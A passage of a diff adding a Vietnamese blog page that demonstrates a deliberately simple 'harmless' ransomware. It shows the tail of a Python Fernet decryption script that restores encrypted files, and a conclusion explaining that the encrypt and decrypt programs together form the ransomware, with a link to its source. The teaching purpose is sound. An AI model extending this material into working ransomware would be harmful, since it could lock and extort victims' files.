+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#e06c75">files</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">deal</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">files</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">content</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">content_decrypted</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span>(<span style="color:#e06c75">key</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">decrypt</span>(<span style="color:#e06c75">content</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">content_decrypted</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;File đã được giải mã!&#34;</span>)
+</span></span></code></pre></div><p>Sau khi chúng ta chạy chương trình này, chúng ta có thể đọc lại nội dung gốc của các file đã bị mã hóa.</p>
+<p><img alt="file1-decrypted" src="/img/file1-decrypted.png"></p>
+<p>Chúng ta cũng có thể xem lại các file ảnh và video.</p>
+<p><img alt="pic-decrypted" src="/img/pic-decrypted.png"></p>
+<hr>
+<h1 id="kết-luận">Kết luận</h1>
+<p>Đó là 2 chương trình mã hóa và giải mã. 2 chương trình đó sẽ kết hợp lại thành 1 con <em>ransomware</em>. Đây chỉ là con ransomware rất đơn giản và vô hại, nếu như nạn nhân có 1 ít kiến thức về mã hóa và giải mã thì họ sẽ không có vấn đề gì trong việc giải mã các file bị mã hóa.</p>
+<p>Nhưng lõi của con ransomware cũng giống như lõi của các con ransomware khác: Khả năng <em>tìm</em> và <em>mã hóa</em> các file trên máy tính và khả năng <em>giải mã</em> các file đó.</p>
+<p>Đó là cách vận hành của mọi ransomware.</p>
+<blockquote>
+<p>Bạn có thể đọc mã nguồn của dự án này tại <a href="https://github.com/namberino/simple-ransomware">đây</a></p>
+</blockquote>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://namberino.github.io/vi/tags/l%E1%BA%ADp-tr%C3%ACnh/">lập trình</a></span>
+        <span class="tag"><a href="https://namberino.github.io/vi/tags/hack/">hack</a></span>
+        <span class="tag"><a href="https://namberino.github.io/vi/tags/b%E1%BA%A3o-m%E1%BA%ADt/">bảo mật</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1300 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2024-02-23 17:37
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fnamberino.github.io%2fvi%2fposts%2f2024%2f02%2fransomware-v%25C3%25B4-h%25E1%25BA%25A1i-nh%25E1%25BA%25A5t-tr%25C3%25AAn-th%25E1%25BA%25BF-gi%25E1%25BB%259Bi%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fnamberino.github.io%2fvi%2fposts%2f2024%2f02%2fransomware-v%25C3%25B4-h%25E1%25BA%25A1i-nh%25E1%25BA%25A5t-tr%25C3%25AAn-th%25E1%25BA%25BF-gi%25E1%25BB%259Bi%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Ransomware%20v%c3%b4%20h%e1%ba%a1i%20nh%e1%ba%a5t%20tr%c3%aan%20th%e1%ba%bf%20gi%e1%bb%9bi&amp;caption=Ransomware%20v%c3%b4%20h%e1%ba%a1i%20nh%e1%ba%a5t%20tr%c3%aan%20th%e1%ba%bf%20gi%e1%bb%9bi&amp;canonicalUrl=https%3a%2f%2fnamberino.github.io%2fvi%2fposts%2f2024%2f02%2fransomware-v%25C3%25B4-h%25E1%25BA%25A1i-nh%25E1%25BA%25A5t-tr%25C3%25AAn-th%25E1%25BA%25BF-gi%25E1%25BB%259Bi%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=Ransomware%20v%c3%b4%20h%e1%ba%a1i%20nh%e1%ba%a5t%20tr%c3%aan%20th%e1%ba%bf%20gi%e1%bb%9bi&amp;body=https%3a%2f%2fnamberino.github.io%2fvi%2fposts%2f2024%2f02%2fransomware-v%25C3%25B4-h%25E1%25BA%25A1i-nh%25E1%25BA%25A5t-tr%25C3%25AAn-th%25E1%25BA%25BF-gi%25E1%25BB%259Bi%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fnamberino.github.io%2fvi%2fposts%2f2024%2f02%2fransomware-v%25C3%25B4-h%25E1%25BA%25A1i-nh%25E1%25BA%25A5t-tr%25C3%25AAn-th%25E1%25BA%25BF-gi%25E1%25BB%259Bi%2f&amp;media=https%3a%2f%2fnamberino.github.io%2fvi%2fposts%2f2024%2f02%2fransomware-v%25C3%25B4-h%25E1%25BA%25A1i-nh%25E1%25BA%25A5t-tr%25C3%25AAn-th%25E1%25BA%25BF-gi%25E1%25BB%259Bi%2f;description=Ransomware%20v%c3%b4%20h%e1%ba%a1i%20nh%e1%ba%a5t%20tr%c3%aan%20th%e1%ba%bf%20gi%e1%bb%9bi" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fnamberino.github.io%2fvi%2fposts%2f2024%2f02%2fransomware-v%25C3%25B4-h%25E1%25BA%25A1i-nh%25E1%25BA%25A5t-tr%25C3%25AAn-th%25E1%25BA%25BF-gi%25E1%25BB%259Bi%2f&amp;title=Ransomware%20v%c3%b4%20h%e1%ba%a1i%20nh%e1%ba%a5t%20tr%c3%aan%20th%e1%ba%bf%20gi%e1%bb%9bi&amp;summary=Ransomware%20v%c3%b4%20h%e1%ba%a1i%20nh%e1%ba%a5t%20tr%c3%aan%20th%e1%ba%bf%20gi%e1%bb%9bi&amp;source=https%3a%2f%2fnamberino.github.io%2fvi%2fposts%2f2024%2f02%2fransomware-v%25C3%25B4-h%25E1%25BA%25A1i-nh%25E1%25BA%25A5t-tr%25C3%25AAn-th%25E1%25BA%25BF-gi%25E1%25BB%259Bi%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fnamberino.github.io%2fvi%2fposts%2f2024%2f02%2fransomware-v%25C3%25B4-h%25E1%25BA%25A1i-nh%25E1%25BA%25A5t-tr%25C3%25AAn-th%25E1%25BA%25BF-gi%25E1%25BB%259Bi%2f&amp;resubmit=true&amp;title=Ransomware%20v%c3%b4%20h%e1%ba%a1i%20nh%e1%ba%a5t%20tr%c3%aan%20th%e1%ba%bf%20gi%e1%bb%9bi" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fnamberino.github.io%2fvi%2fposts%2f2024%2f02%2fransomware-v%25C3%25B4-h%25E1%25BA%25A1i-nh%25E1%25BA%25A5t-tr%25C3%25AAn-th%25E1%25BA%25BF-gi%25E1%25BB%259Bi%2f;title=Ransomware%20v%c3%b4%20h%e1%ba%a1i%20nh%e1%ba%a5t%20tr%c3%aan%20th%e1%ba%bf%20gi%e1%bb%9bi" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=Ransomware%20v%c3%b4%20h%e1%ba%a1i%20nh%e1%ba%a5t%20tr%c3%aan%20th%e1%ba%bf%20gi%e1%bb%9bi%20https%3a%2f%2fnamberino.github.io%2fvi%2fposts%2f2024%2f02%2fransomware-v%25C3%25B4-h%25E1%25BA%25A1i-nh%25E1%25BA%25A5t-tr%25C3%25AAn-th%25E1%25BA%25BF-gi%25E1%25BB%259Bi%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fnamberino.github.io%2fvi%2fposts%2f2024%2f02%2fransomware-v%25C3%25B4-h%25E1%25BA%25A1i-nh%25E1%25BA%25A5t-tr%25C3%25AAn-th%25E1%25BA%25BF-gi%25E1%25BB%259Bi%2f&amp;t=Ransomware%20v%c3%b4%20h%e1%ba%a1i%20nh%e1%ba%a5t%20tr%c3%aan%20th%e1%ba%bf%20gi%e1%bb%9bi" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Ransomware%20v%c3%b4%20h%e1%ba%a1i%20nh%e1%ba%a5t%20tr%c3%aan%20th%e1%ba%bf%20gi%e1%bb%9bi&amp;url=https%3a%2f%2fnamberino.github.io%2fvi%2fposts%2f2024%2f02%2fransomware-v%25C3%25B4-h%25E1%25BA%25A1i-nh%25E1%25BA%25A5t-tr%25C3%25AAn-th%25E1%25BA%25BF-gi%25E1%25BB%259Bi%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://namberino.github.io/vi/posts/2024/02/d%E1%BB%B1-%C3%A1n-m%C3%A1y-t%C3%ADnh-8-bit-tr%C3%AAn-fpga/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">Dự án máy tính 8-bit trên FPGA</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="https://namberino.github.io/vi/posts/2024/02/%C3%A1p-l%E1%BB%B1c-n%C6%B0%E1%BB%9Bc-c%E1%BB%A7a-t%C3%A0u-oceangate-titan/">
+                    <span class="button__text">Áp lực nước của tàu OceanGate Titan</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.85fad2de4f13fec3bcb3b3cb10430cdb44a7b4a9749b32938241a5c6e77718df7624f1002b880521fdc26e24ec1077fda214bf1cb36ee3045510760d09638cae.js" integrity="sha512-hfrS3k8T/sO8s7PLEEMM20SntKl0mzKTgkGlxud3GN92JPEAK4gFIf3CbiTsEHf9ohS/HLNu4wRVEHYNCWOMrg=="></script>
+
+
+
+
+
+    </body>
+</html>
